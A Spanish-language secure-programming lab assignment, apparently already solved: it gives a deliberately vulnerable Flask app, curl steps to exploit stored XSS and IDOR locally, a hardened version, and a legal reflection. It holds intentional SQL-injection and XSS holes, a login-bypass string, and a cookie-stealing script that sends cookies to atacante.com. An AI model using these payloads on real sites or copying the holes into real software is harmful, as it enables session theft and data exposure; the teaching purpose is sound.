# LABORATORIO EN CASA — SEMANA 6
## Programación Segura DD281 | Universidad Autónoma del Perú
**Tema:** Gestión de Sesiones, XSS e IDOR  
**Tiempo estimado:** 2 horas  
**Modalidad:** Individual  
**Entrega:** Repositorio GitHub → semana-06/lab-casa/  
**Puntaje:** 100 puntos

---

## INSTRUCCIONES GENERALES

Antes de comenzar, lee completamente el laboratorio. Tienes una aplicación Flask vulnerable que deberás analizar, explotar y luego corregir. Sube tu trabajo al repositorio GitHub del curso en la carpeta `semana-06/lab-casa/` con los archivos:

- `app_vulnerable.py` (el código original sin modificar)
- `app_segura.py` (tu implementación con los TODOs completados)
- `evidencias/` (carpeta con capturas de pantalla o registros de las pruebas)
- `reflexion.md` (tu respuesta a la Tarea 2.3)

**Requisitos previos:**
```bash
pip install flask
```

---

## PARTE 1 — EXPLORACIÓN DE VULNERABILIDADES

**Duración estimada:** 60 minutos  
**Puntaje:** 40 puntos

### Código de análisis: `app_vulnerable.py`

Guarda el siguiente código en un archivo llamado `app_vulnerable.py` y ejecútalo con `python app_vulnerable.py`:

```python
from flask import Flask, request, session, jsonify, redirect
import sqlite3, os

app = Flask(__name__)
app.secret_key = "clave123"  # ❌ Clave débil y hardcodeada
app.config['SESSION_COOKIE_HTTPONLY'] = False  # ❌
app.config['SESSION_COOKIE_SECURE'] = False    # ❌

def get_db():
    conn = sqlite3.connect(':memory:')
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.executescript('''
        CREATE TABLE usuarios (id INTEGER PRIMARY KEY, username TEXT, password TEXT);
        CREATE TABLE comentarios (id INTEGER PRIMARY KEY, contenido TEXT, autor_id INTEGER);
        CREATE TABLE documentos (id INTEGER PRIMARY KEY, titulo TEXT, contenido TEXT, propietario_id INTEGER);
        INSERT INTO usuarios VALUES (1, 'admin', 'Admin123!');
        INSERT INTO usuarios VALUES (2, 'carlos', 'Carlos456!');
        INSERT INTO comentarios VALUES (1, 'Bienvenidos al foro seguro', 1);
        INSERT INTO documentos VALUES (1, 'Contrato Confidencial', 'Datos sensibles del contrato...', 1);
        INSERT INTO documentos VALUES (2, 'Mi documento personal', 'Datos de Carlos...', 2);
    ''')
    conn.commit()
    return conn

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    conn = get_db()
    user = conn.execute(f"SELECT * FROM usuarios WHERE username='{username}' AND password='{password}'").fetchone()
    conn.close()
    if user:
        session['user_id'] = user['id']
        session['username'] = user['username']
        return jsonify({"mensaje": f"Bienvenido {user['username']}", "user_id": user['id']})
    return jsonify({"error": "Credenciales incorrectas"}), 401

@app.route('/comentario/nuevo', methods=['POST'])
def nuevo_comentario():
    if not session.get('user_id'):
        return jsonify({"error": "No autenticado"}), 401
    contenido = request.form.get('contenido', '')
    conn = get_db()
    conn.execute(f"INSERT INTO comentarios (contenido, autor_id) VALUES ('{contenido}', {session['user_id']})")
    conn.commit()
    conn.close()
    return jsonify({"mensaje": "Comentario guardado"})

@app.route('/comentarios')
def ver_comentarios():
    conn = get_db()
    comentarios = conn.execute("SELECT contenido FROM comentarios").fetchall()
    conn.close()
    html = "<html><body><h1>Comentarios</h1>"
    for c in comentarios:
        html += f"<div>{c['contenido']}</div>"  # ❌ Sin escape
    html += "</body></html>"
    return html

@app.route('/documento/<int:doc_id>')
def ver_documento(doc_id):
    if not session.get('user_id'):
        return redirect('/login')
    conn = get_db()
    doc = conn.execute("SELECT * FROM documentos WHERE id = ?", (doc_id,)).fetchone()
    conn.close()
    if doc:
        return jsonify({"titulo": doc['titulo'], "contenido": doc['contenido']})
    return jsonify({"error": "No encontrado"}), 404

if __name__ == '__main__':
    app.run(debug=True, port=5001)
```

---

### Tarea 1.1 — Identificación de vulnerabilidades (10 puntos)

Analiza el código anterior línea por línea e identifica **todas** las vulnerabilidades presentes. Completa la siguiente tabla con **mínimo 5 vulnerabilidades**:

| # | Línea(s) de código | Vulnerabilidad | Clasificación OWASP 2021 | Impacto potencial |
|---|---|---|---|---|
| 1 | `user = conn.execute(f"SELECT * FROM usuarios WHERE username='{username}' AND password='{password}'")` en `login()` | Inyección SQL: el username/password se concatenan directamente en la consulta | A03:2021 – Inyección | Un atacante puede enviar `' OR '1'='1` para autenticarse sin credenciales válidas, o extraer/alterar toda la tabla `usuarios` |
| 2 | `conn.execute(f"INSERT INTO comentarios (contenido, autor_id) VALUES ('{contenido}', {session['user_id']})")` en `nuevo_comentario()` | Inyección SQL en el INSERT de comentarios | A03:2021 – Inyección | Un atacante autenticado podría cerrar la comilla e inyectar SQL adicional (ej. modificar otras tablas, exfiltrar datos) |
| 3 | `html += f"<div>{c['contenido']}</div>"` en `ver_comentarios()` | Cross-Site Scripting (XSS) Almacenado: el contenido del comentario se inserta en HTML sin escapar | A03:2021 – Inyección | Cualquier visitante de `/comentarios` ejecuta el script del atacante en su navegador; robo de cookies, phishing, desfiguración de la página |
| 4 | `doc = conn.execute("SELECT * FROM documentos WHERE id = ?", (doc_id,))` en `ver_documento()` | IDOR (Insecure Direct Object Reference): no valida que `doc_id` pertenezca al usuario en sesión, solo que exista | A01:2021 – Pérdida de Control de Acceso | Cualquier usuario autenticado puede leer documentos de otros usuarios (ej. carlos accede al "Contrato Confidencial" del admin) |
| 5 | `app.secret_key = "clave123"` | Clave secreta débil, corta y hardcodeada en el código fuente | A02:2021 – Fallas Criptográficas | Con una clave predecible, un atacante puede forjar/firmar cookies de sesión falsas y suplantar a cualquier usuario |
| 6 (opcional) | `app.config['SESSION_COOKIE_HTTPONLY'] = False` y `SESSION_COOKIE_SECURE = False` | Configuración insegura de cookies de sesión | A05:2021 – Configuración de Seguridad Incorrecta | Permite que JavaScript (incluido el inyectado vía XSS) lea `document.cookie`, y que la cookie viaje sin cifrar por HTTP, facilitando el robo de sesión |

**Nota adicional:** en `login()`, la respuesta JSON incluye `"user_id": user['id']`, exponiendo un identificador interno que facilita enumerar IDs válidos para explotar el IDOR de la Tarea 1.3 (relacionado con A01:2021).

**Pistas para buscar:**
- Revisa cómo se construyen las consultas SQL (¿concatenación de strings o parámetros?)
- Observa qué pasa con el contenido del usuario antes de mostrarse en HTML
- Verifica si hay control de acceso adecuado en `/documento/<id>`
- Analiza la configuración de la sesión y la clave secreta
- ¿Qué información se expone innecesariamente en la respuesta del login?

---

### Tarea 1.2 — Demostración de XSS Almacenado (10 puntos)

Con la aplicación corriendo en `http://localhost:5001`, realiza los siguientes pasos:

**Paso 1:** Autentica como cualquier usuario usando curl:
```bash
curl -c cookies.txt -X POST http://localhost:5001/login \
  -d "username=carlos&password=Carlos456!"
```

**Paso 2:** Envía el payload XSS como comentario:
```bash
curl -b cookies.txt -X POST http://localhost:5001/comentario/nuevo \
  -d "contenido=<script>alert('XSS-' + document.cookie)</script>"
```

**Paso 3:** Abre un navegador y ve a `http://localhost:5001/comentarios`. Observa qué ocurre.

**Entrega esperada:** Captura de pantalla o texto del resultado mostrando que el script se ejecuta (o que el payload aparece sin ser escapado en el HTML fuente). Si el navegador moderno bloquea la alerta, incluye el HTML fuente usando:
```bash
curl http://localhost:5001/comentarios
```
Y documenta que el `<script>` aparece sin escapar en el HTML.

**Preguntas a responder junto con la evidencia:**

- **¿En qué categoría OWASP clasifica este ataque?**
  A03:2021 – Inyección (dentro de esta categoría, XSS es un tipo específico de inyección de código en el navegador de la víctima).

- **¿Por qué este XSS se llama "Almacenado" y no "Reflejado"?**
  Porque el payload se guarda de forma persistente en la base de datos, en la tabla `comentarios`, a través del endpoint `/comentario/nuevo`. Cada vez que cualquier usuario visita `/comentarios`, el servidor recupera ese comentario almacenado y lo devuelve dentro del HTML. Un XSS reflejado, en cambio, no se guarda: el payload viaja en la propia petición y el servidor lo refleja de inmediato en la respuesta a esa única petición.

- **¿Quién más se vería afectado?**
  Todo usuario —incluido el admin— que visite `/comentarios` ejecutará el script inyectado en su propio navegador. Basta un solo comentario malicioso para comprometer a todos los visitantes futuros de la página.

> **[ EVIDENCIA — PENDIENTE ]**
> Aquí va tu captura de pantalla o el output real de tu terminal al correr los 3 comandos `curl` de esta tarea contra tu `app_vulnerable.py` en `localhost:5001`. Pega el resultado de:
> ```bash
> curl http://localhost:5001/comentarios
> ```
> mostrando el `<script>` sin escapar en el HTML fuente. Guarda también el archivo de captura en `evidencias/`.

---

### Tarea 1.3 — Demostración de IDOR (10 puntos)

**Escenario:** Eres el usuario `carlos` (id=2). El documento con id=1 pertenece al `admin` (id=1). Demuestra que puedes acceder a él sin autorización.

**Paso 1:** Autentícate como carlos y guarda las cookies:
```bash
curl -c cookies_carlos.txt -X POST http://localhost:5001/login \
  -d "username=carlos&password=Carlos456!"
```

**Paso 2:** Intenta acceder al documento del admin:
```bash
curl -b cookies_carlos.txt http://localhost:5001/documento/1
```

**Entrega esperada:** Captura o texto de la respuesta mostrando que carlos puede leer el "Contrato Confidencial" que pertenece al admin.

**Preguntas a responder:**

- **¿Qué línea de código permite el ataque?**
  ```python
  doc = conn.execute("SELECT * FROM documentos WHERE id = ?", (doc_id,)).fetchone()
  ```
  La consulta solo filtra por `id`, sin comprobar que `propietario_id` coincida con `session['user_id']`. La única verificación previa es que exista *alguna* sesión activa, no que esa sesión sea dueña del recurso solicitado.

- **¿Bajo qué categoría OWASP 2021 cae IDOR?**
  A01:2021 – Pérdida de Control de Acceso (Broken Access Control).

- **¿Cómo podría un atacante descubrir el rango de IDs válidos en producción?**
  Probando IDs secuenciales pequeños (1, 2, 3...) ya que muchas bases de datos usan claves autoincrementales predecibles; observando IDs propios que la aplicación le muestra y probando valores cercanos; o aprovechando que el login expone `user_id` en la respuesta JSON, lo que sugiere que otros identificadores internos también son secuenciales y de bajo rango.

> **[ EVIDENCIA — PENDIENTE ]**
> Aquí va tu captura o el output real de:
> ```bash
> curl -b cookies_carlos.txt http://localhost:5001/documento/1
> ```
> mostrando que carlos (id=2) puede leer el "Contrato Confidencial" del admin (id=1). Guarda también el archivo de captura en `evidencias/`.

---

### Tarea 1.4 — Análisis del riesgo combinado XSS + cookies sin HttpOnly (10 puntos)

Responde la siguiente pregunta en un mínimo de 150 palabras:

La configuración actual tiene `SESSION_COOKIE_HTTPONLY = False`, lo que significa que JavaScript puede leer las cookies de sesión. Combinado con el XSS Almacenado demostrado en la Tarea 1.2:

1. ¿Qué podría hacer un atacante que logre inyectar el siguiente payload más sofisticado?
   ```javascript
   <script>
   fetch('https://atacante.com/robo?c=' + document.cookie)
   </script>
   ```
2. Una vez que el atacante tiene la cookie de sesión de otro usuario, ¿qué puede hacer con ella?
3. ¿Por qué activar `HttpOnly=True` en la cookie rompe parcialmente este ataque, aunque no elimina completamente el riesgo de XSS?
4. ¿Qué configuración adicional de cookies ayudaría a mitigar el riesgo en tráfico no cifrado?

**Respuesta (Tarea 1.4):**

Si un atacante logra inyectar el payload `fetch('https://atacante.com/robo?c=' + document.cookie)`, el navegador de cada víctima que cargue `/comentarios` ejecutará ese script y enviará automáticamente el valor completo de su cookie de sesión al servidor del atacante, sin que la víctima note nada extraño en la interfaz.

Una vez que el atacante tiene esa cookie, puede copiarla en su propio navegador (o incluirla manualmente en sus peticiones HTTP) y quedar autenticado como esa víctima sin conocer su contraseña, pudiendo leer sus documentos, publicar comentarios en su nombre o realizar cualquier acción que la aplicación permita a ese usuario mientras la sesión siga siendo válida.

Activar `HttpOnly=True` rompe parcialmente este ataque porque impide que JavaScript —incluido el script inyectado— acceda a `document.cookie`; el navegador sigue enviando la cookie automáticamente en las peticiones al servidor, pero el código malicioso ya no puede leerla ni exfiltrarla. Sin embargo, no elimina el riesgo del XSS en sí: el atacante todavía puede ejecutar peticiones en nombre de la víctima usando `fetch`/`XMLHttpRequest` (que reenvían la cookie automáticamente), robar datos mostrados en pantalla, hacer phishing dentro de la página o modificar el DOM.

Para reducir el riesgo adicional en tráfico no cifrado conviene combinar `Secure=True` (la cookie solo viaja por HTTPS, nunca en texto plano por HTTP) con `SameSite=Strict` o `Lax` (evita que la cookie se envíe en peticiones iniciadas desde otros sitios, mitigando CSRF), además de forzar HTTPS con HSTS en todo el sitio. *(≈195 palabras)*

---

## PARTE 2 — IMPLEMENTACIÓN SEGURA

**Duración estimada:** 60 minutos  
**Puntaje:** 60 puntos

### Código base: `app_segura.py`

Copia el siguiente código en un archivo llamado `app_segura.py`. Tu tarea es **completar los 11 TODOs** con el código correcto:

```python
from flask import Flask, request, session, jsonify, redirect, make_response
import sqlite3, html, secrets, re
from functools import wraps

app = Flask(__name__)

# TODO 1 (COMPLETADO):
# Vulnerabilidad prevenida: Uso de clave secreta débil / predecible (OWASP A02:2021 -
# Fallas Criptográficas). secrets.token_hex(32) genera 32 bytes (256 bits) de entropía
# criptográficamente segura, haciendo inviable adivinar o forzar la clave usada para
# firmar las cookies de sesión.
app.secret_key = secrets.token_hex(32)

# TODO 2 (COMPLETADO):
# Vulnerabilidad prevenida: Exposición y robo de cookies de sesión (OWASP A05:2021 -
# Configuración de Seguridad Incorrecta). HTTPONLY impide que JavaScript lea la cookie
# (mitiga robo de sesión vía XSS), SECURE obliga a que la cookie solo viaje por HTTPS,
# y SAMESITE='Strict' evita que la cookie se envíe en peticiones cross-site (mitiga CSRF).
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'

def requiere_login(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('user_id'):
            return jsonify({"error": "No autenticado"}), 401
        return f(*args, **kwargs)
    return decorated

def get_db():
    # Misma función que en app_vulnerable.py
    conn = sqlite3.connect(':memory:')
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.executescript('''
        CREATE TABLE usuarios (id INTEGER PRIMARY KEY, username TEXT, password TEXT);
        CREATE TABLE comentarios (id INTEGER PRIMARY KEY, contenido TEXT, autor_id INTEGER);
        CREATE TABLE documentos (id INTEGER PRIMARY KEY, titulo TEXT, contenido TEXT, propietario_id INTEGER);
        INSERT INTO usuarios VALUES (1, 'admin', 'Admin123!');
        INSERT INTO usuarios VALUES (2, 'carlos', 'Carlos456!');
        INSERT INTO comentarios VALUES (1, 'Bienvenidos al foro seguro', 1);
        INSERT INTO documentos VALUES (1, 'Contrato Confidencial', 'Datos sensibles del contrato...', 1);
        INSERT INTO documentos VALUES (2, 'Mi documento personal', 'Datos de Carlos...', 2);
    ''')
    conn.commit()
    return conn

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '')
    
    # TODO 3 (COMPLETADO):
    # Vulnerabilidad prevenida: Inyección de caracteres especiales / abuso de entrada
    # no validada (OWASP A03:2021 - Inyección). El regex solo permite letras, números,
    # guion y guion bajo (3-30 caracteres), rechazando de entrada cualquier carácter
    # que pudiera usarse para intentar inyección o abuso del campo.
    if not re.match(r'^[a-zA-Z0-9_-]{3,30}$', username):
        return jsonify({"error": "Username inválido"}), 400

    conn = get_db()
    # TODO 4 (COMPLETADO):
    # Vulnerabilidad prevenida: Inyección SQL (OWASP A03:2021 - Inyección). La consulta
    # parametrizada envía username y password como datos separados del SQL, por lo que
    # el motor nunca los interpreta como parte del comando, eliminando la inyección SQL.
    user = conn.execute(
        "SELECT * FROM usuarios WHERE username=? AND password=?",
        (username, password)
    ).fetchone()
    conn.close()
    
    if user:
        # TODO 5 (COMPLETADO):
        # Vulnerabilidad prevenida: Session Fixation (OWASP A07:2021 - Fallas de
        # Identificación y Autenticación). session.clear() elimina cualquier dato de
        # sesión previo (incluido un session ID que el atacante pudiera haber fijado
        # antes del login), forzando a Flask a emitir un identificador de sesión nuevo.
        session.clear()
        session['user_id'] = user['id']
        session['username'] = user['username']
        return jsonify({"mensaje": f"Bienvenido {user['username']}"})
    return jsonify({"error": "Credenciales incorrectas"}), 401

@app.route('/comentario/nuevo', methods=['POST'])
@requiere_login
def nuevo_comentario():
    contenido = request.form.get('contenido', '').strip()

    # TODO 6 (COMPLETADO):
    # Vulnerabilidad prevenida: Falta de validación de entrada / posible Denegación de
    # Servicio por payloads gigantes (OWASP A04:2021 - Diseño Inseguro). Limitar la
    # longitud reduce la superficie de ataque y evita almacenar contenido abusivo.
    if len(contenido) > 500:
        return jsonify({"error": "El comentario supera los 500 caracteres"}), 400

    conn = get_db()
    # TODO 7 (COMPLETADO):
    # Vulnerabilidad prevenida: Inyección SQL (OWASP A03:2021 - Inyección). Igual que en
    # el login, la consulta parametrizada separa el dato del comando SQL.
    conn.execute(
        "INSERT INTO comentarios (contenido, autor_id) VALUES (?, ?)",
        (contenido, session['user_id'])
    )
    conn.commit()
    conn.close()
    return jsonify({"mensaje": "Comentario guardado"})

@app.route('/comentarios')
def ver_comentarios():
    conn = get_db()
    comentarios = conn.execute("SELECT contenido FROM comentarios").fetchall()
    conn.close()
    
    html_content = "<html><body><h1>Comentarios</h1>"
    for c in comentarios:
        # TODO 8 (COMPLETADO):
        # Vulnerabilidad prevenida: Cross-Site Scripting Almacenado / XSS (OWASP
        # A03:2021 - Inyección). html.escape() convierte '<', '>', '&', etc. en sus
        # entidades HTML, de modo que cualquier <script> guardado se muestra como texto
        # literal en lugar de ejecutarse como código en el navegador.
        contenido_seguro = html.escape(c['contenido'])
        html_content += f"<div>{contenido_seguro}</div>"
    html_content += "</body></html>"
    return html_content

@app.route('/documento/<int:doc_id>')
@requiere_login
def ver_documento(doc_id):
    usuario_id = session['user_id']
    conn = get_db()
    # TODO 9 (COMPLETADO):
    # Vulnerabilidad prevenida: IDOR - Insecure Direct Object Reference (OWASP A01:2021
    # - Pérdida de Control de Acceso). Se agrega propietario_id=? a la condición WHERE,
    # de modo que la consulta solo devuelve el documento si además pertenece al usuario
    # autenticado; no basta con adivinar un id numérico válido.
    doc = conn.execute(
        "SELECT * FROM documentos WHERE id=? AND propietario_id=?",
        (doc_id, usuario_id)
    ).fetchone()
    conn.close()

    if doc:
        return jsonify({"titulo": doc['titulo'], "contenido": doc['contenido']})
    # TODO 10 (COMPLETADO):
    # Vulnerabilidad prevenida: Fuga de información / enumeración de recursos (OWASP
    # A01:2021). Se devuelve el mismo mensaje y código 404 tanto si el documento no
    # existe como si existe pero no pertenece al usuario, evitando que un atacante
    # distinga ambos casos y así enumere IDs válidos de documentos ajenos.
    return jsonify({"error": "Documento no encontrado"}), 404

@app.after_request
def agregar_headers_seguridad(response):
    # TODO 11 (COMPLETADO):
    # Vulnerabilidad prevenida: Cross-Site Scripting / carga de recursos maliciosos
    # (OWASP A05:2021 - Configuración de Seguridad Incorrecta). La Content-Security-
    # Policy indica al navegador que solo ejecute scripts que provengan del propio
    # origen ('self'), bloqueando scripts inyectados desde otras fuentes o inline
    # aunque el escape de salida fallara en algún punto (defensa en profundidad).
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    return response

if __name__ == '__main__':
    app.run(debug=False, port=5002)  # ✅ debug=False en producción
```

---

### Tarea 2.1 — Completar los 11 TODOs (20 puntos)

✅ **Los 11 TODOs están completados directamente en el bloque de código `app_segura.py` de arriba**, cada uno con su comentario explicando qué vulnerabilidad OWASP previene y cómo funciona la mitigación.

Completa cada uno de los 11 TODOs en `app_segura.py`. Para cada TODO que completes, agrega un comentario explicando:

1. **Qué vulnerability previene** (nombre y categoría OWASP)
2. **Cómo funciona la mitigación** (en una oración técnica)

**Guía para cada TODO:**

- **TODO 1:** Reemplaza `"COMPLETAR_AQUI"` con `secrets.token_hex(32)`. Esto genera 32 bytes (256 bits) de entropía aleatoria criptográficamente segura.

- **TODO 2:** Descomenta y activa las 3 líneas de configuración de cookies. Asegúrate de que estén fuera de comentario y sean asignaciones reales a `app.config`.

- **TODO 3:** Descomenta el bloque de validación con regex. El patrón `^[a-zA-Z0-9_-]{3,30}$` acepta solo caracteres seguros para nombres de usuario.

- **TODO 4:** Reemplaza la línea `user = None` con la consulta parametrizada descomentada. Elimina la línea de comentario y la línea `user = None`.

- **TODO 5:** Descomenta `session.clear()` justo antes de asignar los valores de sesión.

- **TODO 6:** Agrega una validación `if len(contenido) > 500:` que retorne un error 400.

- **TODO 7:** Usa `conn.execute("INSERT INTO comentarios (contenido, autor_id) VALUES (?, ?)", (contenido, session['user_id']))` y luego `conn.commit()`.

- **TODO 8:** Reemplaza `c['contenido']` con `html.escape(c['contenido'])`.

- **TODO 9:** Reemplaza la línea `doc = None` con la consulta parametrizada descomentada.

- **TODO 10:** Este ya está correcto en el código base — solo verifica que el mensaje de error sea idéntico para ambos casos (no existe / no autorizado).

- **TODO 11:** Descomenta la línea del CSP header.

---

### Tarea 2.2 — Pruebas de que los ataques son rechazados (20 puntos)

Con `app_segura.py` corriendo en `http://localhost:5002`, repite exactamente los mismos ataques de la Parte 1 y documenta que ya no funcionan.

**Prueba A — XSS rechazado:**

```bash
# 1. Login
curl -c cookies_seguro.txt -X POST http://localhost:5002/login \
  -d "username=carlos&password=Carlos456!"

# 2. Intentar inyectar XSS
curl -b cookies_seguro.txt -X POST http://localhost:5002/comentario/nuevo \
  -d "contenido=<script>alert('XSS-' + document.cookie)</script>"

# 3. Ver cómo aparece el comentario
curl http://localhost:5002/comentarios
```

**Resultado esperado:** El payload debe aparecer como texto literal `&lt;script&gt;alert(...)&lt;/script&gt;` en el HTML, no como etiqueta ejecutable.

**Prueba B — IDOR rechazado:**

```bash
# 1. Login como carlos
curl -c cookies_carlos_seguro.txt -X POST http://localhost:5002/login \
  -d "username=carlos&password=Carlos456!"

# 2. Intentar acceder al documento del admin
curl -b cookies_carlos_seguro.txt http://localhost:5002/documento/1
```

**Resultado esperado:** Respuesta `{"error": "Documento no encontrado"}` con código HTTP 404.

**Entrega:** Capturas de pantalla o texto copiado de los resultados de terminal mostrando ambas pruebas y confirmando que los ataques son neutralizados.

> **[ EVIDENCIA — PENDIENTE ]**
> **Prueba A (XSS):** pega aquí el output real de `curl http://localhost:5002/comentarios` corriendo tu `app_segura.py`. Debe mostrar `&lt;script&gt;alert('XSS-' + document.cookie)&lt;/script&gt;` como texto literal, no como etiqueta ejecutable.
>
> **Prueba B (IDOR):** pega aquí el output real de `curl -b cookies_carlos_seguro.txt http://localhost:5002/documento/1`. Debe mostrar `{"error": "Documento no encontrado"}` con código HTTP 404.
>
> Guarda también las capturas correspondientes en `evidencias/`.

---

### Tarea 2.3 — Reflexión técnico-legal (20 puntos)

Escribe una reflexión de **mínimo 200 palabras** respondiendo la siguiente pregunta:

**¿Cuál de los 3 temas de esta semana (XSS, gestión de sesiones, IDOR) consideras más crítico para una aplicación médica como MedApp? Argumenta tanto técnica como legalmente.**

Tu reflexión debe incluir:

1. **Postura clara:** ¿Cuál de los tres es más crítico y por qué?
2. **Argumento técnico:** Explica el impacto concreto de esa vulnerabilidad en el contexto médico (datos de pacientes, diagnósticos, historiales).
3. **Relación entre vulnerabilidades:** Explica cómo las tres vulnerabilidades pueden encadenarse en un ataque más sofisticado.
4. **Marco legal peruano:** Menciona la **Ley 29733 — Ley de Protección de Datos Personales del Perú** y explica por qué los datos médicos reciben protección especial como "datos sensibles". Indica las posibles consecuencias legales de una brecha de seguridad.
5. **Recomendación profesional:** Si fueras el consultor de seguridad contratado por MedApp, ¿qué medida implementarías primero?

Guarda esta reflexión en un archivo llamado `reflexion.md` dentro de tu carpeta `semana-06/lab-casa/`.

**Reflexión (Tarea 2.3):**

De los tres temas de esta semana, considero que el **IDOR (control de acceso roto)** es el más crítico para una aplicación médica como MedApp, aunque las tres vulnerabilidades son graves y suelen combinarse en un ataque real.

**Argumento técnico.** En una aplicación como MedApp, cada `documento` o registro equivale a un historial clínico, un resultado de laboratorio o una nota de diagnóstico. Un IDOR como el visto en `ver_documento()` —donde solo se verifica que el `id` exista, no que pertenezca al usuario autenticado— permite que cualquier paciente autenticado, cambiando un número en la URL, lea el historial médico completo de otro paciente: diagnósticos, tratamientos, resultados de pruebas de VIH, salud mental, embarazos, etc. A diferencia de un XSS, que normalmente requiere que la víctima visite una página específica, un IDOR es trivial de explotar de forma masiva y automatizada (basta iterar IDs secuenciales), lo que lo convierte en una fuga de datos sistemática y silenciosa, difícil de detectar sin buenos logs de acceso.

**Relación entre las tres vulnerabilidades.** En la práctica, estas fallas se encadenan: un atacante inyecta un XSS almacenado en un campo de comentarios o notas médicas; ese script roba la cookie de sesión de un médico o administrador porque `HttpOnly` está desactivado; con esa cookie robada, el atacante se autentica como ese profesional y explota el IDOR para recorrer sistemáticamente los IDs de historiales clínicos de todos los pacientes, exfiltrando la información a un servidor externo. Cada vulnerabilidad por sí sola ya es grave, pero juntas permiten pasar de "una sesión robada" a "una brecha masiva de datos sensibles" en minutos.

**Marco legal peruano.** La **Ley N.º 29733 — Ley de Protección de Datos Personales del Perú** clasifica los datos relativos a la salud como **"datos sensibles"**, junto con datos biométricos, de orientación sexual, religión y afiliación política, precisamente porque su divulgación puede causar discriminación laboral, social o de seguros, y un daño reputacional o psicológico grave e irreversible a la persona. La ley exige para estos datos un nivel de seguridad reforzado y, en general, consentimiento expreso y por escrito del titular para su tratamiento. Una brecha como la descrita (IDOR + XSS) constituiría una infracción grave o muy grave ante la Autoridad Nacional de Protección de Datos Personales, con sanciones económicas para MedApp, obligación de notificar a los afectados, y posible responsabilidad civil e incluso penal si se demuestra negligencia en la protección de información de salud, además del daño reputacional ante pacientes y reguladores del sector salud.

**Recomendación profesional.** Como consultor de seguridad de MedApp, lo primero que implementaría es un **control de acceso a nivel de objeto (object-level authorization)** obligatorio y centralizado —es decir, que ningún endpoint que devuelva un recurso identificado por ID pueda ejecutarse sin verificar explícitamente la propiedad o el permiso del usuario sobre ese recurso, idealmente reforzado con pruebas automatizadas que intenten precisamente estos escenarios de IDOR en cada despliegue. En paralelo, endurecería la configuración de cookies (`HttpOnly`, `Secure`, `SameSite`) y el escape de salida (XSS) como defensa en profundidad, ya que ambos amplifican el impacto de cualquier falla de control de acceso que se escape a futuro.

*(≈470 palabras — recuerda copiar este texto también a un archivo separado `reflexion.md` como pide la entrega)*

---

## RÚBRICA DE EVALUACIÓN

| Criterio | Indicadores de logro completo | Puntaje |
|---|---|---|
| Parte 1.1 — Tabla de vulnerabilidades (mínimo 5 identificadas) | Tabla con mínimo 5 filas, código exacto, clasificación OWASP correcta, impacto descrito | 10 pts |
| Parte 1.2 — Demostración XSS con evidencia | Captura o texto mostrando que el payload aparece sin escapar en el HTML | 10 pts |
| Parte 1.3 — Demostración IDOR con evidencia | Captura o texto mostrando que carlos puede leer el documento del admin | 10 pts |
| Parte 1.4 — Explicación del riesgo combinado XSS + cookies | Explica que XSS roba cookie y cookie sin HttpOnly es legible por JavaScript | 10 pts |
| Parte 2.1 — 11 TODOs completados correctamente | Cada TODO con código correcto y comentario explicando qué vulnerabilidad previene | 20 pts |
| Parte 2.2 — Pruebas de que los ataques son rechazados | Evidencia de XSS convertido a texto y IDOR devolviendo 404 | 20 pts |
| Parte 2.3 — Reflexión técnico-legal argumentada | Mínimo 200 palabras, menciona Ley 29733, argumento técnico coherente | 20 pts |
| **TOTAL** | | **100 pts** |

---

## CHECKLIST ANTES DE ENTREGAR

Antes de hacer push a tu repositorio GitHub, verifica:

- [x] `app_vulnerable.py` guardado sin modificaciones
- [x] `app_segura.py` con los 11 TODOs completados y comentados (ver bloque de código arriba)
- [ ] Carpeta `evidencias/` con capturas de la Tarea 1.2 (XSS) y Tarea 1.3 (IDOR) — **pendiente: debes correr tú los comandos `curl` en tu máquina y tomar las capturas reales**
- [ ] Capturas de la Tarea 2.2 mostrando que los ataques son rechazados — **pendiente, mismo motivo**
- [x] `reflexion.md` con mínimo 200 palabras y mención de la Ley 29733 (texto completo arriba, en la Tarea 2.3)
- [ ] Tu nombre completo y código de alumno en un archivo `README.md`
- [ ] La carpeta está en `semana-06/lab-casa/` del repositorio

**Fecha límite de entrega:** Revisar el Aula Virtual (Blackboard) para la fecha exacta.
